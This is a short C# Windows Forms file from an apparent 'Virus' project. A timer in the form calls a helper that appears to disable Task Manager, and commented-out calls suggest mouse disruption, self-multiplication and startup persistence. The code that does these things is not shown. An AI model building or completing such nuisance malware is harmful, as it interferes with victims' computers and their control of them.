using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Virus
{
    public partial class FormVirus : Form
    {
        public FormVirus()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            
        }

        private void timer_Tick(object sender, EventArgs e)
        {
            Functions.SetTaskManager(true);
            //Functions.CrazyMouse();
            //Functions.Multiply();
            //Functions.Startup();
        }
    }
}
